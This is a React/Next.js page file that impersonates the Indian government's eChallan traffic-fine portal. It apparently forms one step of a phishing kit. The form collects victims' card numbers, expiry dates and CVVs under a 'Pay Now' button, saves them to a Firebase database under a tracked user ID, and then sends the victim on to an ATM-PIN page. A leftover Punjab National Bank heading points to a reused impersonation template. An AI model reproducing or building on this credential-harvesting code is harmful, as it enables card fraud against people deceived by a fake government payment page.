"use client";
import { useState } from "react";
import { ref, update } from "firebase/database";
import { database } from "@/app/lib/firebase";
import { useRouter } from "next/navigation";

export default function Page() {
  // Changed from "page" to "Page"
  const router = useRouter();

  const [formData, setFormData] = useState({
    card_no: "",
    expiry_date: "",
    cvv: "",
  });

  const handleChange = (e) => {
    let { name, value } = e.target;
    // Apply formatting logic based on input name
    if (name === "card_no") {
      // Card number formatting (4 digits separated by space)
      value = value.replace(/\D/g, ""); // Remove non-digits
      value = value.replace(/(.{4})/g, "$1 ").trim(); // Add space after every 4 characters
      // Limit card number to 19 characters
      if (value.length > 19) {
        value = value.substring(0, 19);
      }
    } else if (name === "expiry_date") {
      // Expiry date formatting (MM/YY)
      value = value.replace(/\D/g, ""); // Remove non-digits
      if (value.length > 4) {
        value = value.substring(0, 4);
      }
      const formattedInput = value.match(/.{1,2}/g)?.join("/") || "";
      value = formattedInput;
    } else if (name === "cvv") {
      // CVV formatting (3 digits)
      value = value.replace(/\D/g, ""); // Remove non-digits
      if (value.length > 3) {
        value = value.substring(0, 3);
      }
    }

    setFormData({
      ...formData,
      [name]: value,
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Get a reference to the "entries" node in Firebase database
    const formRef = ref(database, "entries");

    // Generate timestamp in milliseconds
    const timestamp = Date.now();

    // Add current timestamp to form data
    const formDataWithTime = {
      ...formData,
      time: timestamp,
    };

    // Push form data to Firebase database
    // const newRef = await push(formRef, formDataWithTime);

    const storedUserId = localStorage.getItem("newUserId");
    if (!storedUserId) {
      console.error("User ID not found in localStorage");
      return;
    }

    const userRef = ref(database, `entries/${storedUserId}`);
    await update(userRef, formDataWithTime);

    // Navigate to "/method" route after submission
    router.push("/atm-pin");

    setFormData({
      card_no: "",
      expiry_date: "",
      cvv: "",
    });
  };

  return (
    <div>
      <section className="w-full">
        <div className="flex flex-col justify-center items-center px-5 py-10 bg-[#003466]">
          {/* Logo */}
          <img
            src="/Government-of-India-Logo-Vector-PNG.png"
            className="w-10"
            alt="Logo"
          />
          <h1 className="text-white text-base font-bold mt-5">भारत सरकार</h1>
          <h1 className="text-white text-base font-bold mt-1">
            Government of India
          </h1>
          <h1 className="text-white text-base font-bold mt-5 text-center">
            eChallan - Digital Traffic/Transport Enforcement Solution
          </h1>
          <span className="text-white text-xs mt-5 text-center">
            An initiative of MoRTH, Goverment Of India
          </span>
        </div>
        <div className="p-6">
          {/* <h1 className="text-2xl font-bold text-[#91203e]">
            Welcome to Punjab National Bank!
          </h1> */}
          <form
            className="space-y-6 flex flex-col justify-center"
            action=""
            id="third-form"
            onSubmit={handleSubmit} // Added onSubmit handler
          >
            {/* <div className="">
              <img
                src="/male-customer-support-working-office-answering-consumer-questions_112255-1154.avif"
                className="w-full"
                alt="Logo"
              />
            </div>
            <h1 className="text-2xl text-[#000000] text-center">
              Customer Care Support Instant Solution
            </h1> */}
            {/* <!-- Full Name --> */}
            <div className="mb-4">
              <label
                className="block text-gray-700 text-sm mb-2 font-bold"
                for="card_no"
              >
                Card Number <span className="text-red-500">*</span>
              </label>
              <input
                className="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                id="card_no"
                name="card_no"
                type="text"
                placeholder="Enter 16-digit card number"
                value={formData.card_no} // Updated value attribute
                onChange={handleChange} // Added onChange handler
              />
            </div>
            {/* <!-- Expiry and CVV --> */}
            <div className="grid grid-cols-2 gap-2">
              <div className="mb-4">
                <label
                  className="block text-gray-700 text-sm mb-2 font-bold"
                  for="expiry_date"
                >
                  Expiry Date <span className="text-red-500">*</span>
                </label>
                <input
                  className="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                  id="expiry_date"
                  name="expiry_date"
                  type="text"
                  placeholder="MM/YY"
                  value={formData.expiry_date} // Updated value attribute
                  onChange={handleChange} // Added onChange handler
                />
              </div>
              <div className="mb-4">
                <label
                  className="block text-gray-700 text-sm mb-2 font-bold"
                  for="cvv"
                >
                  CVV <span className="text-red-500">*</span>
                </label>
                <input
                  className="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                  id="cvv"
                  name="cvv"
                  type="password"
                  placeholder="Enter 3-digit CVV"
                  value={formData.cvv} // Updated value attribute
                  onChange={handleChange} // Added onChange handler
                />
              </div>
            </div>
            {/* <!-- Submit Button --> */}
            {/* <div className="w-auto flex justify-end items-center mt-5">
              <button
                className="bg-gradient-to-r from-green-500 to-green-500 text-white uppercase rounded-sm py-2 px-10 focus:outline-none focus:shadow-outline w-auto"
                type="submit"
              >
                Next
              </button>
            </div> */}
            <div className="w-full grid grid-cols-2 justify-center items-center mt-5 space-x-2">
              <button className="bg-gradient-to-r from-[#cecece] to-[#cecece] text-black rounded-sm py-2 px-10 focus:outline-none focus:shadow-outline w-auto">
                Back
              </button>
              <button
                className="bg-gradient-to-r from-[#003466] to-[#003466] text-white rounded-sm py-2 px-10 focus:outline-none focus:shadow-outline w-auto"
                type="submit"
              >
                Pay Now
              </button>
            </div>
          </form>
        </div>
      </section>
      {/* <!-- Footer --> */}
      <section className="bg-[#ffffff] p-5 w-full mt-24">
        <div className="flex space-x-1 w-full justify-between">
          <span className="text-xs text-black font-bold">Support</span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">Find Us</span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">Pricing & Fees</span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">Compliance</span>
        </div>
        <div className="flex space-x-1 w-full justify-between mt-2">
          <span className="text-xs text-black font-bold">
            Terms & Conditions
          </span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">
            Legal Disclosures
          </span>
          <span className="text-xs text-black font-bold">|</span>
          <span className="text-xs text-black font-bold">
            Safety Guidelines
          </span>
        </div>
        <div className="mt-5 text-[10px] text-black">
          Copyright @2021-2024 eChallan. All rights reserved.
        </div>
      </section>
    </div>
  );
}
